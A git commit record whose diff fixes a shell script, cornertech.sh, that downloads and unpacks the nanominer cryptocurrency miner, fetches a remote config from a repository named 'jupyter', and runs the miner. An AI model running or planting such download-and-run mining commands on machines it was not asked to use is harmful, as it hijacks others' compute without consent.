430b86ca64934f802dd92b05067f170a4430cb0b
djancoegs1 <109600291+djancoegs1@users.noreply.github.com>
2022-07-19 18:12:37 +0000

    Update cornertech.sh

--- cornertech.sh
+++ cornertech.sh
@@ -2,5 +2,5 @@ wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-li
 tar -xvf nanominer-linux-3.5.2.tar.gz
 cd nanominer-linux-3.5.2
 rm -rf termt.ini
-https://raw.githubusercontent.com/djancoegs1/jupyter/main/termt.ini
+wget https://raw.githubusercontent.com/djancoegs1/jupyter/main/termt.ini
 ./nanominer termt.ini
